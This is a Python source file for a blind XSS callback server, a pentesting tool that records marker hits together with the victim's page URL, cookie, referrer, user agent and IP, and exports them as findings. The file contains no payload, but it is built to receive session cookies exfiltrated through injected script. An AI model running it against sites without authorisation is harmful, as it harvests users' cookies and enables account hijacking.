#!/usr/bin/env python3

import json
import logging
import threading
import time
from datetime import datetime, timezone
from typing import Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlparse

logger = logging.getLogger(__name__)

try:
    from http.server import BaseHTTPRequestHandler, HTTPServer
    HTTP_AVAILABLE = True
except Exception:
    HTTP_AVAILABLE = False
    BaseHTTPRequestHandler = None
    HTTPServer = None


class BlindCallback:
    """Represents a single blind XSS callback."""
    def __init__(self, marker: str, source_url: Optional[str] = None, 
                 cookie: Optional[str] = None, referrer: Optional[str] = None,
                 user_agent: Optional[str] = None, ip_address: Optional[str] = None):
        self.marker = marker
        self.source_url = source_url
        self.cookie = cookie
        self.referrer = referrer
        self.user_agent = user_agent
        self.ip_address = ip_address
        self.timestamp = datetime.now(timezone.utc).isoformat()
        self.triggered_at = None

    def to_dict(self) -> Dict:
        return {
            "marker": self.marker,
            "source_url": self.source_url,
            "cookie": self.cookie,
            "referrer": self.referrer,
            "user_agent": self.user_agent,
            "ip_address": self.ip_address,
            "timestamp": self.timestamp,
            "triggered_at": self.triggered_at,
        }

    def trigger(self) -> None:
        """Mark callback as triggered."""
        self.triggered_at = datetime.now(timezone.utc).isoformat()


class CallbackStorage:
    """Thread-safe storage for blind XSS callbacks."""
    def __init__(self):
        self.callbacks: Dict[str, List[BlindCallback]] = {}
        self.lock = threading.Lock()

    def register_marker(self, marker: str) -> None:
        """Register a new marker for tracking."""
        with self.lock:
            if marker not in self.callbacks:
                self.callbacks[marker] = []

    def record_callback(self, marker: str, callback: BlindCallback) -> None:
        """Record a callback for a marker."""
        with self.lock:
            if marker not in self.callbacks:
                self.callbacks[marker] = []
            self.callbacks[marker].append(callback)

    def get_callbacks(self, marker: Optional[str] = None) -> Dict:
        """Get callbacks for a specific marker or all markers."""
        with self.lock:
            if marker:
                return {
                    marker: [c.to_dict() for c in self.callbacks.get(marker, [])]
                }
            return {
                marker: [c.to_dict() for c in callbacks]
                for marker, callbacks in self.callbacks.items()
            }

    def get_triggered_count(self, marker: str) -> int:
        """Get count of triggered callbacks for a marker."""
        with self.lock:
            return sum(1 for c in self.callbacks.get(marker, []) if c.triggered_at)

    def clear_marker(self, marker: str) -> None:
        with self.lock:
            if marker in self.callbacks:
                del self.callbacks[marker]

    def clear_all(self) -> None:
        with self.lock:
            self.callbacks.clear()

    def export_findings(self) -> List[Dict]:
        """Export all findings as list of dicts."""
        with self.lock:
            findings = []
            for marker, callbacks in self.callbacks.items():
                triggered = [c for c in callbacks if c.triggered_at]
                if triggered:
                    findings.append({
                        "marker": marker,
                        "triggered_count": len(triggered),
                        "total_callbacks": len(callbacks),
                        "callbacks": [c.to_dict() for c in triggered]
                    })
            return findings


# Global storage instance
_storage = CallbackStorage()


class BlindCallbackHandler(BaseHTTPRequestHandler):
    """HTTP request handler for blind XSS callbacks."""

    def log_message(self, format, *args):
        """Suppress default logging."""
        logger.debug(f"Callback Handler: {format % args}")

    def do_GET(self) -> None:
        """Handle GET requests."""
        if not self.path.startswith("/"):
            self.send_error(400, "Invalid path")
            return

        parsed_path = urlparse(self.path)
        path = parsed_path.path
        query = parse_qs(parsed_path.query)

        # API endpoints
        if path == "/api/status":
            self._handle_status()
        elif path == "/api/callbacks":
            self._handle_get_callbacks(query)
        elif path == "/api/export":
            self._handle_export()
        elif path.startswith("/"):
            # Blind callback trigger - format: /{marker}?u=url&c=cookie
            self._handle_callback(path, query)
        else:
            self.send_error(404, "Not found")

    def do_POST(self) -> None:
        """Handle POST requests."""
        parsed_path = urlparse(self.path)
        path = parsed_path.path

        if path == "/api/register":
            self._handle_register()
        else:
            self.send_error(404, "Not found")

    def _handle_callback(self, path: str, query: Dict) -> None:
        """Handle blind callback trigger."""
        # Path format: /{marker} or /{marker}.js
        marker = path.strip("/").replace(".js", "")
        
        if not marker:
            self.send_error(400, "No marker provided")
            return

        # Extract callback data from query parameters
        source_url = query.get("u", [None])[0]
        cookie = query.get("c", [None])[0]
        referrer = self.headers.get("Referer")
        user_agent = self.headers.get("User-Agent")
        ip_address = self.client_address[0]

        callback = BlindCallback(
            marker=marker,
            source_url=source_url,
            cookie=cookie,
            referrer=referrer,
            user_agent=user_agent,
            ip_address=ip_address
        )
        callback.trigger()
        _storage.record_callback(marker, callback)

        logger.info(f"Blind XSS callback received: marker={marker}, source={source_url}")

        # Respond with 204 No Content
        self.send_response(204)
        self.end_headers()

    def _handle_status(self) -> None:
        """GET /api/status - Get server status and callback counts."""
        callbacks_data = _storage.get_callbacks()
        status = {
            "status": "running",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "markers": {
                marker: {
                    "total": len(cbs),
                    "triggered": sum(1 for cb in cbs if cb.get("triggered_at"))
                }
                for marker, cbs in callbacks_data.items()
            },
            "total_markers": len(callbacks_data),
            "total_callbacks": sum(
                len(cbs) for cbs in callbacks_data.values()
            ),
        }

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(status, indent=2).encode())

    def _handle_get_callbacks(self, query: Dict) -> None:
        """GET /api/callbacks?marker=<marker> - Get callbacks for a marker."""
        marker = query.get("marker", [None])[0]

        if not marker:
            callbacks_data = _storage.get_callbacks()
            response = {"callbacks": callbacks_data}
        else:
            callbacks_data = _storage.get_callbacks(marker)
            response = {"callbacks": callbacks_data}

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(response, indent=2).encode())

    def _handle_export(self) -> None:
        """GET /api/export - Export all findings as JSON."""
        findings = _storage.export_findings()
        response = {
            "exported_at": datetime.now(timezone.utc).isoformat(),
            "findings_count": len(findings),
            "findings": findings
        }

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Disposition", 'attachment; filename="blind_xss_findings.json"')
        self.end_headers()
        self.wfile.write(json.dumps(response, indent=2).encode())

    def _handle_register(self) -> None:
        """POST /api/register - Register a marker for tracking."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="ignore")

        try:
            data = json.loads(body) if body else {}
            marker = data.get("marker")

            if not marker:
                self.send_error(400, "Marker required")
                return

            _storage.register_marker(marker)
            response = {
                "status": "registered",
                "marker": marker,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(response, indent=2).encode())
        except json.JSONDecodeError:
            self.send_error(400, "Invalid JSON")


def start_collector(host: str = "127.0.0.1", port: int = 8000, daemon: bool = True) -> Optional[Tuple]:
    """Start the blind XSS callback collector server."""
    if not HTTP_AVAILABLE:
        logger.error("HTTP server not available")
        return None

    try:
        server = HTTPServer((host, port), BlindCallbackHandler)
        thread = threading.Thread(target=server.serve_forever, daemon=daemon)
        thread.start()
        logger.info(f"Blind callback collector started on http://{host}:{port}")
        return (server, thread)
    except OSError as e:
        logger.error(f"Failed to start callback collector: {e}")
        return None


def stop_collector(server) -> None:
    """Stop the callback collector server."""
    if server:
        server.shutdown()
        logger.info("Blind callback collector stopped")


def get_callback_results(marker: Optional[str] = None) -> Dict:
    """Get results for a marker or all markers."""
    return _storage.get_callbacks(marker)


def export_blind_findings() -> List[Dict]:
    return _storage.export_findings()


def register_blind_marker(marker: str) -> None:
    _storage.register_marker(marker)


def reset_blind_storage() -> None:
    _storage.clear_all()


if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    
    server_info = start_collector(host="0.0.0.0", port=8000, daemon=False)
    if server_info:
        server, thread = server_info
        try:
            logger.info("Callback collector running. Press Ctrl+C to stop.")
            thread.join()
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            stop_collector(server)
    else:
        logger.error("Failed to start callback collector")
